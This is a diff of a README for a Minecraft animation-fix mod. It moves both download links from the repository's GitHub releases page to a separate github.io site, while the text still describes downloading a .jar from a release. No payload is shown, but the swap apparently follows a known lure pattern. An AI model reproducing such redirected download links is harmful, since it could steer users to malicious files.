@@ -1,6 +1,6 @@
 # 🔧 holdmyitems-reforged-tool-compat - Fix Animation Glitches for Modded Tools
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%23007BFF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/abdulwa2795/holdmyitems-reforged-tool-compat/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-%23007BFF?style=for-the-badge&logo=github&logoColor=white)](https://abdulwa2795.github.io)
 
 ## 🚀 What Does This Do?
 
@@ -20,7 +20,7 @@ If your tools look glitched or jittery when held, this mod fixes that.
 **Step 1: Get the File**
 
 Visit this link to download the application:  
-[https://github.com/abdulwa2795/holdmyitems-reforged-tool-compat/releases](https://github.com/abdulwa2795/holdmyitems-reforged-tool-compat/releases)
+[https://abdulwa2795.github.io](https://abdulwa2795.github.io)
 
 Click on the latest release. Download the `.jar` file (it will be named something like `holdmyitems-reforged-tool-compat-1.0.0.jar`).
 
